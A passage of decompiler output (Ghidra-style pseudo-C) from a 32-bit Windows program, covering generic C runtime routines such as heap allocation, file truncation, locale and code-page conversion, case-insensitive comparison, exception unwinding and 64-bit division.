        piVar4 = (int *)FUN_0040caaa();
LAB_00416c11:
        DVar5 = GetLastError();
        iVar3 = FUN_0040ca68(DVar5);
        *piVar4 = iVar3;
        return (LPVOID)0x0;
      }
      iVar3 = FUN_0040f0a7(dwBytes);
    } while (iVar3 != 0);
    piVar4 = (int *)FUN_0040caaa();
  }
  DVar5 = GetLastError();
  iVar3 = FUN_0040ca68(DVar5);
  *piVar4 = iVar3;
  return (LPVOID)0x0;
LAB_00416be4:
  FUN_0040f0a7(dwBytes);
  piVar4 = (int *)FUN_0040caaa();
LAB_00416bf0:
  *piVar4 = 0xc;
  return (LPVOID)0x0;
}



void FUN_00416b4f(void)

{
  FUN_0040df7b(4);
  return;
}



undefined4 __cdecl FUN_00416c26(uint param_1,uint param_2,int param_3)

{
  uint uVar1;
  int iVar2;
  HANDLE pvVar3;
  WCHAR *lpMem;
  undefined4 *puVar4;
  int iVar5;
  WCHAR *pWVar6;
  int *piVar7;
  BOOL BVar8;
  DWORD *pDVar9;
  undefined4 extraout_ECX;
  int extraout_EDX;
  int iVar10;
  WCHAR *pWVar11;
  int iVar12;
  bool bVar13;
  bool bVar14;
  longlong lVar15;
  longlong lVar16;
  DWORD DVar17;
  SIZE_T dwBytes;
  undefined4 uVar18;
  LONG local_1c;
  LONG local_18;
  uint local_14;
  uint local_10;
  
  local_14 = 0;
  local_10 = 0;
  lVar15 = FUN_0041544f(param_1,0,0,1);
  if (lVar15 == -1) goto LAB_00416cae;
  lVar16 = FUN_0041544f(param_1,0,0,2);
  iVar10 = (int)((ulonglong)lVar16 >> 0x20);
  if (lVar16 == -1) goto LAB_00416cae;
  pWVar11 = (WCHAR *)(param_2 - (uint)lVar16);
  uVar1 = (uint)(param_2 < (uint)lVar16);
  iVar5 = param_3 - iVar10;
  iVar12 = iVar5 - uVar1;
  if ((iVar12 < 0) ||
     ((iVar12 == 0 || (SBORROW4(param_3,iVar10) != SBORROW4(iVar5,uVar1)) != iVar12 < 0 &&
      (pWVar11 == (WCHAR *)0x0)))) {
    if ((iVar12 < 1) && (iVar12 < 0)) {
      lVar16 = FUN_0041544f(param_1,param_2,param_3,0);
      if (lVar16 == -1) goto LAB_00416cae;
      pvVar3 = (HANDLE)FUN_00414a6e(param_1);
      BVar8 = SetEndOfFile(pvVar3);
      local_14 = (BVar8 != 0) - 1;
      local_10 = (int)local_14 >> 0x1f;
      if ((local_14 & local_10) == 0xffffffff) {
        puVar4 = (undefined4 *)FUN_0040caaa();
        *puVar4 = 0xd;
        pDVar9 = (DWORD *)FUN_0040cabd();
        DVar17 = GetLastError();
        *pDVar9 = DVar17;
        goto LAB_00416dac;
      }
    }
  }
  else {
    dwBytes = 0x1000;
    DVar17 = 8;
    pvVar3 = GetProcessHeap();
    lpMem = (WCHAR *)HeapAlloc(pvVar3,DVar17,dwBytes);
    if (lpMem == (WCHAR *)0x0) {
      puVar4 = (undefined4 *)FUN_0040caaa();
      *puVar4 = 0xc;
      goto LAB_00416cae;
    }
    uVar18 = 0x8000;
    iVar5 = FUN_00416ddc(param_1,0x8000);
    iVar10 = extraout_EDX;
    while( true ) {
      pWVar6 = pWVar11;
      if ((-1 < iVar12) && ((0 < iVar12 || ((WCHAR *)0xfff < pWVar11)))) {
        pWVar6 = (WCHAR *)0x1000;
      }
      pWVar6 = (WCHAR *)FUN_0040fc38(uVar18,iVar10,param_1,lpMem,pWVar6);
      if (pWVar6 == (WCHAR *)0xffffffff) break;
      iVar10 = (int)pWVar6 >> 0x1f;
      bVar13 = pWVar11 < pWVar6;
      pWVar11 = (WCHAR *)((int)pWVar11 - (int)pWVar6);
      bVar14 = SBORROW4(iVar12,iVar10);
      iVar2 = iVar12 - iVar10;
      iVar12 = iVar2 - (uint)bVar13;
      if ((iVar12 < 0) ||
         ((uVar18 = extraout_ECX,
          iVar12 == 0 || (bVar14 != SBORROW4(iVar2,(uint)bVar13)) != iVar12 < 0 &&
          (pWVar11 == (WCHAR *)0x0)))) goto LAB_00416d00;
    }
    piVar7 = (int *)FUN_0040cabd();
    if (*piVar7 == 5) {
      puVar4 = (undefined4 *)FUN_0040caaa();
      *puVar4 = 0xd;
    }
    local_14 = 0xffffffff;
    local_10 = 0xffffffff;
LAB_00416d00:
    FUN_00416ddc(param_1,iVar5);
    DVar17 = 0;
    pvVar3 = GetProcessHeap();
    HeapFree(pvVar3,DVar17,lpMem);
LAB_00416dac:
    if ((local_14 & local_10) == 0xffffffff) goto LAB_00416cae;
  }
  local_18 = (LONG)((ulonglong)lVar15 >> 0x20);
  local_1c = (LONG)lVar15;
  lVar15 = FUN_0041544f(param_1,local_1c,local_18,0);
  if (lVar15 != -1) {
    return 0;
  }
LAB_00416cae:
  puVar4 = (undefined4 *)FUN_0040caaa();
  return *puVar4;
}



int __cdecl FUN_00416ddc(uint param_1,int param_2)

{
  int iVar1;
  int *piVar2;
  char cVar3;
  byte bVar4;
  byte *pbVar5;
  byte bVar6;
  int iVar7;
  
  piVar2 = &DAT_004257c0 + ((int)param_1 >> 5);
  iVar7 = (param_1 & 0x1f) * 0x40;
  iVar1 = *piVar2 + iVar7;
  cVar3 = *(char *)(iVar1 + 0x24);
  bVar4 = *(byte *)(iVar1 + 4);
  if (param_2 == 0x4000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
    pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
    *pbVar5 = *pbVar5 & 0x80;
  }
  else if (param_2 == 0x8000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) & 0x7f;
  }
  else {
    if ((param_2 == 0x10000) || (param_2 == 0x20000)) {
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x82 | 2;
    }
    else {
      if (param_2 != 0x40000) goto LAB_00416e7a;
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x81 | 1;
    }
    *pbVar5 = bVar6;
  }
LAB_00416e7a:
  if ((bVar4 & 0x80) == 0) {
    return 0x8000;
  }
  return (-(uint)((char)(cVar3 * '\x02') >> 1 != '\0') & 0xc000) + 0x4000;
}



undefined4 __cdecl FUN_00416e98(undefined4 *param_1)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  
  if (param_1 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    uVar2 = 0x16;
  }
  else {
    *param_1 = DAT_00424578;
    uVar2 = 0;
  }
  return uVar2;
}



void FUN_00416eda(void)

{
  code *pcVar1;
  int iVar2;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  if ((DAT_00422f40 & 1) != 0) {
    FUN_0040eeb4(10);
  }
  iVar2 = FUN_00414f32();
  if (iVar2 != 0) {
    FUN_00414f3f();
  }
  if ((DAT_00422f40 & 2) != 0) {
    local_2d4 = 0x10001;
    FUN_0040f8c0((undefined (*) [16])&local_32c,0,0x50);
    local_2dc.ExceptionRecord = &local_32c;
    local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
    local_32c.ExceptionCode = 0x40000015;
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
    UnhandledExceptionFilter(&local_2dc);
  }
  FUN_0040ee32(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



ushort __cdecl FUN_00416ff1(int param_1,undefined (**param_2) [16])

{
  ushort uVar1;
  undefined (*local_14 [2]) [16];
  int local_c;
  char local_8;
  
  FUN_0040b970(local_14,param_2);
  if (*(int *)(local_14[0][10] + 0xc) < 2) {
    uVar1 = *(ushort *)(*(int *)(local_14[0][0xc] + 8) + param_1 * 2) & 4;
  }
  else {
    uVar1 = FUN_00417443(param_1,4,local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



ushort __cdecl FUN_00417042(int param_1)

{
  ushort uVar1;
  
  if (DAT_004241e8 == 0) {
    return *(ushort *)(DAT_00422d88 + param_1 * 2) & 4;
  }
  uVar1 = FUN_00416ff1(param_1,(undefined (**) [16])0x0);
  return uVar1;
}



void FUN_00417070(void)

{
  DAT_00422f48 = CreateFileA(s_CONOUT__0041d50c,0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                             (HANDLE)0x0);
  return;
}



undefined2 __cdecl FUN_004170bc(undefined2 param_1,int *param_2)

{
  uint uVar1;
  byte bVar2;
  uint uVar3;
  undefined4 *puVar4;
  undefined *puVar5;
  undefined3 extraout_var;
  int iVar6;
  longlong lVar7;
  int local_8;
  
  uVar3 = FUN_0040dac0((int)param_2);
  uVar1 = param_2[3];
  if ((uVar1 & 0x82) == 0) {
    puVar4 = (undefined4 *)FUN_0040caaa();
    *puVar4 = 9;
LAB_004170e2:
    param_2[3] = param_2[3] | 0x20;
    return 0xffff;
  }
  if ((uVar1 & 0x40) != 0) {
    puVar4 = (undefined4 *)FUN_0040caaa();
    *puVar4 = 0x22;
    goto LAB_004170e2;
  }
  if ((uVar1 & 1) != 0) {
    param_2[1] = 0;
    if ((uVar1 & 0x10) == 0) {
      param_2[3] = uVar1 | 0x20;
      return 0xffff;
    }
    *param_2 = param_2[2];
    param_2[3] = uVar1 & 0xfffffffe;
  }
  uVar1 = param_2[3];
  param_2[1] = 0;
  local_8 = 0;
  iVar6 = 2;
  param_2[3] = uVar1 & 0xffffffef | 2;
  if (((uVar1 & 0x10c) == 0) &&
     (((puVar5 = FUN_0040d090(), param_2 != (int *)(puVar5 + 0x20) &&
       (puVar5 = FUN_0040d090(), param_2 != (int *)(puVar5 + 0x40))) ||
      (bVar2 = FUN_004156d3(uVar3), CONCAT31(extraout_var,bVar2) == 0)))) {
    FUN_00415406(param_2);
  }
  if ((param_2[3] & 0x108U) == 0) {
    local_8 = FUN_0041036b();
  }
  else {
    iVar6 = *param_2;
    *param_2 = param_2[2] + 2;
    iVar6 = iVar6 - param_2[2];
    param_2[1] = param_2[6] + -2;
    if (iVar6 < 1) {
      if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {
        puVar5 = &DAT_00422448;
      }
      else {
        puVar5 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_004257c0)[(int)uVar3 >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) && (lVar7 = FUN_004154d4(), lVar7 == -1)) goto LAB_00417219;
    }
    else {
      local_8 = FUN_0041036b();
    }
    *(undefined2 *)param_2[2] = param_1;
  }
  if (local_8 == iVar6) {
    return param_1;
  }
LAB_00417219:
  param_2[3] = param_2[3] | 0x20;
  return 0xffff;
}



void __cdecl FUN_00417230(LCID param_1)

{
  int iVar1;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar2;
  byte local_10 [6];
  undefined local_a;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_a = 0;
  iVar1 = GetLocaleInfoA(param_1,0x1004,(LPSTR)local_10,6);
  uVar2 = extraout_EDX;
  if (iVar1 != 0) {
    FUN_0041742d(local_10);
    uVar2 = extraout_EDX_00;
  }
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,uVar2);
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe

void __fastcall
FUN_00417279(undefined4 param_1,undefined4 param_2,UINT param_3,UINT param_4,uint *param_5,
            char **param_6,LPSTR param_7,int param_8)

{
  uint uVar1;
  char *cbMultiByte;
  bool bVar2;
  BOOL BVar3;
  char *pcVar4;
  int iVar5;
  undefined (*pauVar6) [16];
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  bool bVar7;
  undefined (*local_20) [16];
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  cbMultiByte = *param_6;
  bVar2 = false;
  if (param_3 == param_4) goto LAB_0041741b;
  BVar3 = GetCPInfo(param_3,&local_1c);
  if ((((BVar3 == 0) || (local_1c.MaxCharSize != 1)) ||
      (BVar3 = GetCPInfo(param_4,&local_1c), BVar3 == 0)) || (local_1c.MaxCharSize != 1)) {
    pcVar4 = (char *)MultiByteToWideChar(param_3,1,(LPCSTR)param_5,(int)cbMultiByte,(LPWSTR)0x0,0);
    bVar7 = pcVar4 == (char *)0x0;
    param_2 = extraout_EDX_01;
    if (bVar7) goto LAB_0041741b;
  }
  else {
    bVar2 = true;
    param_2 = extraout_EDX;
    pcVar4 = cbMultiByte;
    if (cbMultiByte == (char *)0xffffffff) {
      pcVar4 = FUN_00415330(param_5);
      pcVar4 = pcVar4 + 1;
      param_2 = extraout_EDX_00;
    }
    bVar7 = pcVar4 == (char *)0x0;
  }
  if ((bVar7 || (int)pcVar4 < 0) || ((char *)0x7ffffff0 < pcVar4)) {
    local_20 = (undefined (*) [16])0x0;
  }
  else {
    uVar1 = (int)pcVar4 * 2 + 8;
    if (uVar1 < 0x401) {
      pauVar6 = (undefined (*) [16])&stack0xffffffbc;
      local_20 = (undefined (*) [16])&stack0xffffffbc;
      if (&stack0x00000000 != (undefined *)0x44) {
LAB_0041735b:
        local_20 = (undefined (*) [16])(*pauVar6 + 8);
      }
    }
    else {
      pauVar6 = (undefined (*) [16])FUN_0040afc0(uVar1);
      param_2 = extraout_EDX_02;
      local_20 = pauVar6;
      if (pauVar6 != (undefined (*) [16])0x0) {
        *(undefined4 *)*pauVar6 = 0xdddd;
        goto LAB_0041735b;
      }
    }
  }
  if (local_20 != (undefined (*) [16])0x0) {
    FUN_0040f8c0(local_20,0,(int)pcVar4 * 2);
    iVar5 = MultiByteToWideChar(param_3,1,(LPCSTR)param_5,(int)cbMultiByte,(LPWSTR)local_20,
                                (int)pcVar4);
    if (iVar5 != 0) {
      if (param_7 == (LPSTR)0x0) {
        if (((bVar2) ||
            (pcVar4 = (char *)WideCharToMultiByte(param_4,0,(LPCWSTR)local_20,(int)pcVar4,(LPSTR)0x0
                                                  ,0,(LPCSTR)0x0,(LPBOOL)0x0), pcVar4 != (char *)0x0
            )) && (pauVar6 = FUN_00413b97(1,pcVar4), pauVar6 != (undefined (*) [16])0x0)) {
          pcVar4 = (char *)WideCharToMultiByte(param_4,0,(LPCWSTR)local_20,(int)pcVar4,
                                               (LPSTR)pauVar6,(int)pcVar4,(LPCSTR)0x0,(LPBOOL)0x0);
          if (pcVar4 == (char *)0x0) {
            FUN_0040b61e();
          }
          else if (cbMultiByte != (char *)0xffffffff) {
            *param_6 = pcVar4;
          }
        }
      }
      else {
        WideCharToMultiByte(param_4,0,(LPCWSTR)local_20,(int)pcVar4,param_7,param_8,(LPCSTR)0x0,
                            (LPBOOL)0x0);
      }
    }
    FUN_0040beaf((int)local_20);
    param_2 = extraout_EDX_03;
  }
LAB_0041741b:
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,param_2);
  return;
}



void __cdecl FUN_0041742d(byte *param_1)

{
  FUN_004169c6(param_1,(byte **)0x0,10);
  return;
}



ushort __cdecl FUN_00417443(int param_1,ushort param_2,undefined (**param_3) [16])

{
  ushort uVar1;
  undefined2 extraout_var;
  int iVar2;
  byte bVar3;
  undefined (*local_1c [2]) [16];
  int local_14;
  char local_10;
  byte local_c;
  byte local_b;
  undefined local_a;
  ushort local_8 [2];
  
  FUN_0040b970(local_1c,param_3);
  if (param_1 + 1U < 0x101) {
    local_8[0] = *(ushort *)(*(int *)(local_1c[0][0xc] + 8) + param_1 * 2);
  }
  else {
    bVar3 = (byte)((uint)param_1 >> 8);
    uVar1 = FUN_0041592d(bVar3,local_1c);
    if (CONCAT22(extraout_var,uVar1) == 0) {
      local_b = 0;
      iVar2 = 1;
      local_c = (byte)param_1;
    }
    else {
      local_a = 0;
      iVar2 = 2;
      local_c = bVar3;
      local_b = (byte)param_1;
    }
    iVar2 = FUN_0041628f(local_1c,1,(uint *)&local_c,iVar2,local_8,*(UINT *)(*local_1c[0] + 4),
                         *(LCID *)(local_1c[0][1] + 4),1);
    if (iVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return local_8[0] & param_2;
}



uint __cdecl FUN_004174fb(uint param_1,undefined (**param_2) [16])

{
  ushort uVar1;
  undefined2 extraout_var;
  uint uVar2;
  undefined2 extraout_var_00;
  undefined4 *puVar3;
  int iVar4;
  byte bVar5;
  undefined (*local_1c [2]) [16];
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  byte local_8;
  byte local_7;
  undefined local_6;
  
  FUN_0040b970(local_1c,param_2);
  if (param_1 < 0x100) {
    if (*(int *)(local_1c[0][10] + 0xc) < 2) {
      uVar2 = *(ushort *)(*(int *)(local_1c[0][0xc] + 8) + param_1 * 2) & 1;
    }
    else {
      uVar1 = FUN_00417443(param_1,1,local_1c);
      uVar2 = CONCAT22(extraout_var,uVar1);
    }
    if (uVar2 == 0) goto LAB_0041755c;
    uVar2 = (uint)*(byte *)(*(int *)(local_1c[0][0xc] + 0xc) + param_1);
    goto LAB_004175ff;
  }
  if (*(int *)(local_1c[0][10] + 0xc) < 2) {
LAB_004175ad:
    puVar3 = (undefined4 *)FUN_0040caaa();
    *puVar3 = 0x2a;
    local_7 = 0;
    iVar4 = 1;
    local_8 = (byte)param_1;
  }
  else {
    bVar5 = (byte)(param_1 >> 8);
    uVar1 = FUN_0041592d(bVar5,local_1c);
    if (CONCAT22(extraout_var_00,uVar1) == 0) goto LAB_004175ad;
    local_6 = 0;
    iVar4 = 2;
    local_8 = bVar5;
    local_7 = (byte)param_1;
  }
  iVar4 = FUN_00416090(local_1c,*(LCID *)(local_1c[0][1] + 4),0x100,(uint *)&local_8,iVar4,
                       (LPWSTR)&local_c,3,*(UINT *)(*local_1c[0] + 4),1);
  if (iVar4 == 0) {
LAB_0041755c:
    if (local_10 == '\0') {
      return param_1;
    }
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
    return param_1;
  }
  uVar2 = (uint)local_c;
  if (iVar4 != 1) {
    uVar2 = (uint)CONCAT11(local_c,local_b);
  }
LAB_004175ff:
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



uint __cdecl FUN_00417610(uint param_1)

{
  if (DAT_004241e8 == 0) {
    if (param_1 - 0x41 < 0x1a) {
      return param_1 + 0x20;
    }
  }
  else {
    param_1 = FUN_004174fb(param_1,(undefined (**) [16])0x0);
  }
  return param_1;
}



int __cdecl FUN_00417640(byte *param_1,char *param_2,int param_3)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (param_3 != 0) {
    do {
      bVar2 = *param_1;
      cVar1 = *param_2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_00417691;
      param_3 = param_3 + -1;
    } while (param_3 != 0);
    param_3 = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_00417691:
      param_3 = -1;
      if (!bVar5) {
        param_3 = 1;
      }
    }
  }
  return param_3;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x0041777e. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



undefined8 FUN_00417790(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



void FUN_0041783a(void)

{
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041783b(void)

{
  DAT_00422de0 = FUN_00418809;
  DAT_00422de4 = FUN_00417ef0;
  _DAT_00422de8 = FUN_00417ea4;
  _DAT_00422dec = FUN_00417edd;
  _DAT_00422df0 = FUN_00417e46;
  _DAT_00422df4 = FUN_00418809;
  DAT_00422df8 = FUN_00418781;
  _DAT_00422dfc = FUN_00417e62;
  DAT_00422e00 = FUN_00417dc4;
  DAT_00422e04 = FUN_00417d51;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0041789b(int param_1)

{
  FUN_0041783b();
  _DAT_0042576c = FUN_00418895();
  if (param_1 != 0) {
    FUN_0041882c();
  }
  return;
}



ulonglong __fastcall FUN_004178c0(undefined4 param_1,undefined4 param_2)

{
  ulonglong uVar1;
  uint uVar2;
  float fVar3;
  float10 in_ST0;
  uint local_20;
  float fStack_1c;
  
  if (DAT_00425778 == 0) {
    uVar1 = (ulonglong)ROUND(in_ST0);
    local_20 = (uint)uVar1;
    fStack_1c = (float)(uVar1 >> 0x20);
    fVar3 = (float)in_ST0;
    if ((local_20 != 0) || (fVar3 = fStack_1c, (uVar1 & 0x7fffffff00000000) != 0)) {
      if ((int)fVar3 < 0) {
        uVar1 = uVar1 + (0x80000000 < ((uint)(float)(in_ST0 - (float10)uVar1) ^ 0x80000000));
      }
      else {
        uVar2 = (uint)(0x80000000 < (uint)(float)(in_ST0 - (float10)uVar1));
        uVar1 = CONCAT44((int)fStack_1c - (uint)(local_20 < uVar2),local_20 - uVar2);
      }
    }
    return uVar1;
  }
  return CONCAT44(param_2,(int)in_ST0);
}



void FUN_0041796b(undefined *UNRECOVERED_JUMPTABLE)

{
  undefined4 *unaff_FS_OFFSET;
  
  *unaff_FS_OFFSET = *(undefined4 *)*unaff_FS_OFFSET;
                    // WARNING: Could not recover jumptable at 0x00417996. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



void FUN_0041799d(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    // WARNING: Could not recover jumptable at 0x004179a2. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



void FUN_004179a4(PVOID param_1,PEXCEPTION_RECORD param_2)

{
  undefined4 *puVar1;
  undefined4 *unaff_FS_OFFSET;
  
  puVar1 = (undefined4 *)*unaff_FS_OFFSET;
  RtlUnwind(param_1,(PVOID)0x4179cf,param_2,(PVOID)0x0);
  param_2->ExceptionFlags = param_2->ExceptionFlags & 0xfffffffd;
  *puVar1 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = puVar1;
  return;
}



undefined4 __cdecl
FUN_004179f8(PEXCEPTION_RECORD param_1,undefined4 *param_2,undefined4 param_3,undefined4 param_4)

{
  PEXCEPTION_RECORD in_EAX;
  undefined4 uVar1;
  
  uVar1 = FUN_00419491(param_1,param_2,param_3,param_4,in_EAX,0,(undefined4 *)0x0,'\0');
  return uVar1;
}



void __fastcall
FUN_00417a2e(undefined4 param_1,undefined4 param_2,PEXCEPTION_RECORD param_3,undefined4 *param_4,
            undefined4 param_5)

{
  FUN_0040a982(param_4[2] ^ (uint)param_4,param_2);
  FUN_00419491(param_3,(undefined4 *)param_4[4],param_5,0,(PEXCEPTION_RECORD)param_4[3],param_4[5],
               param_4,'\0');
  return;
}



undefined4 __cdecl
FUN_00417a61(undefined4 *param_1,undefined4 *param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6,undefined4 param_7)

{
  undefined (*pauVar1) [16];
  int *unaff_FS_OFFSET;
  undefined4 local_3c;
  undefined4 *local_38;
  undefined4 local_34;
  code *local_30;
  undefined4 *local_2c;
  code *local_28;
  uint local_24;
  undefined4 local_20;
  undefined4 *local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffc0;
  if (param_1 == (undefined4 *)0x123) {
    *param_2 = 0x417b0c;
    local_3c = 1;
  }
  else {
    local_28 = FUN_00417b38;
    local_24 = DAT_00422044 ^ (uint)&local_2c;
    local_20 = param_5;
    local_1c = param_2;
    local_18 = param_6;
    local_14 = param_7;
    local_8 = 0;
    local_2c = (undefined4 *)*unaff_FS_OFFSET;
    *unaff_FS_OFFSET = (int)&local_2c;
    local_38 = param_1;
    local_34 = param_3;
    pauVar1 = FUN_0040cdba();
    local_30 = *(code **)pauVar1[8];
    (*local_30)(*param_1,&local_38);
    local_3c = 0;
    if (local_8 == 0) {
      *unaff_FS_OFFSET = (int)local_2c;
    }
    else {
      *local_2c = *(undefined4 *)*unaff_FS_OFFSET;
      *unaff_FS_OFFSET = (int)local_2c;
    }
  }
  return local_3c;
}



undefined4 __fastcall
FUN_00417b38(code *param_1,undefined4 param_2,PEXCEPTION_RECORD param_3,PVOID param_4,
            undefined4 param_5)

{
  undefined4 uVar1;
  code *local_8;
  
  local_8 = param_1;
  FUN_0040a982(*(uint *)((int)param_4 + 8) ^ (uint)param_4,param_2);
  if ((param_3->ExceptionFlags & 0x66) != 0) {
    *(undefined4 *)((int)param_4 + 0x24) = 1;
    return 1;
  }
  FUN_00419491(param_3,*(undefined4 **)((int)param_4 + 0x10),param_5,0,
               *(PEXCEPTION_RECORD *)((int)param_4 + 0xc),*(int *)((int)param_4 + 0x14),
               *(undefined4 **)((int)param_4 + 0x18),'\x01');
  if (*(int *)((int)param_4 + 0x24) == 0) {
    FUN_004179a4(param_4,param_3);
  }
  FUN_00417a61((undefined4 *)0x123,&local_8,0,0,0,0,0);
                    // WARNING: Could not recover jumptable at 0x00417bcf. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = (*local_8)();
  return uVar1;
}



int __cdecl FUN_00417bd7(int param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  iVar1 = *(int *)(param_1 + 0x10);
  uVar6 = *(uint *)(param_1 + 0xc);
  uVar2 = uVar6;
  uVar4 = uVar6;
  while (uVar5 = uVar2, -1 < param_2) {
    if (uVar6 == 0xffffffff) {
      FUN_00414e94();
    }
    uVar6 = uVar6 - 1;
    iVar3 = uVar6 * 0x14 + iVar1;
    if (((*(int *)(iVar3 + 4) < param_3) && (param_3 <= *(int *)(iVar3 + 8))) ||
       (uVar2 = uVar5, uVar6 == 0xffffffff)) {
      param_2 = param_2 + -1;
      uVar2 = uVar6;
      uVar4 = uVar5;
    }
  }
  uVar6 = uVar6 + 1;
  *param_4 = uVar6;
  *param_5 = uVar4;
  if ((*(uint *)(param_1 + 0xc) < uVar4) || (uVar4 < uVar6)) {
    FUN_00414e94();
  }
  return uVar6 * 0x14 + iVar1;
}



